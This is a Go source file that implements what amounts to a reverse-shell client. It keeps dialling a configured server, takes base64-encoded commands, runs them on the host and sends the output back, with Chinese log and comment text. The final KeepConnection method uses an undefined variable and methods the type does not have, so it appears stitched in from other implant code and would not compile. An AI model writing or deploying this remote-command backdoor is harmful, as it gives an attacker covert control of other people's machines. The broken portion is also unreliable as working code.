package connect

import (
	"bufio"
	"encoding/base64"
	"log"
	"net"
	"time"
)

// var (
// 	// cmd执行超时的秒数
// 	Timeout = 30 * time.Second
// 	charset = "utf-8"
// 	IP      string
// 	ConChan chan net.Conn
// )

type runner struct {
	timeout   time.Duration
	gerrors   chan error
	charset   string
	ipPort    string
	conChan   chan net.Conn
	Connected bool
}

func new(ip string, port string) (*runner, error) {
	r := runner{
		gerrors: make(chan error),
		timeout: 30 * time.Second,
		charset: "utf-8",
		ipPort:  ip + ":" + port,
		conChan: make(chan net.Conn),
	}

	return &r, nil
}

//创建于serer端的tcp连接
func Connect(ip string, port string) {
	runner, err := new(ip, port)
	if err != nil {
		log.Println(err)
	}

	//开始连接
	go runner.buildConect()

	for conn := range runner.conChan {
		log.Println(conn)
		log.Println("连接成功......")
		message, _ := bufio.NewReader(conn).ReadString('\n')
		decodedCase, _ := base64.StdEncoding.DecodeString(message)
		out, err := RunCommandWithErr(string(decodedCase))
		if err != nil {
			log.Println(err)
		}
		log.Println(out)
		base64Out := base64.StdEncoding.EncodeToString([]byte(out))
		log.Println(base64Out)
		conn.Write([]byte(base64Out + "\n"))
		// buf := make([]byte, 4096)
		// n, _ := conn.Read(buf)
		// log.Println(base64.StdEncoding.DecodeString(string(buf[:n])))
	}

	// go runner.doConnect()
	log.Println("xxxxxxxxxx")
	for {
		time.Sleep(10 * time.Second)
	}
}

func (r *runner) buildConect() {

	for {
		if len(r.conChan) < 1 {
			conn, _ := net.Dial("tcp", r.ipPort)
			// if err != nil {
			// 	fmt.Println(err)
			// }
			if conn != nil {
				r.conChan <- conn
			}
		}

		time.Sleep(r.timeout)
	}

}

func (r *runner) KeepConnection() {
	sleepTime := 30 * time.Second

	for {
		if r.Connected {
			time.Sleep(sleepTime)
		}

		err := h.ServerIsAvailable()
		if err != nil {
			h.Log("[!] Error connecting with server: " + err.Error())
			h.Connected = false
			time.Sleep(sleepTime)
			continue
		}

		err = h.SendDeviceSpecs()
		if err != nil {
			h.Log("[!] Error connecting with server: " + err.Error())
			h.Connected = false
			time.Sleep(sleepTime)
			continue
		}

		h.Connected = true
	}
}
